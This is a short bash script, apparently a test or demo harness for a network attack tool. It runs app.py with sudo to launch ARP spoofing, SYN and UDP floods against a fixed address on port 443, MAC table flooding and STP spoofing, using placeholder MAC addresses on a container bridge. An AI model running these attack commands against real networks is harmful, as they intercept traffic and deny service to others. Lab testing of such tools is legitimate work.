#!/bin/bash
sudo ./app.py --debug arpspoof -i lxdbr0 -m aa-aa-aa-aa-aa-aa -gm bb:bb:bb:bb:bb:bb -gip 192.168.0.1 -vm cc:cc:cc:cc:cc:cc -vip 192.168.0.108
sudo ./app.py --debug synflood -d 10.8.8.8 -p 443 -c 100
sudo ./app.py --debug udpflood -d 10.8.8.8 -p 443 -c 100
sudo ./app.py --debug macflood -i lxdbr0 -vm "aa:aa:aa:aa:aa:aa" -c 100000
sudo ./app.py --debug stpspoof -i lxdbr0 -smac "aa:aa:aa:aa:aa:aa" -dmac "bb:bb:bb:bb:bb:bb" -p 45056
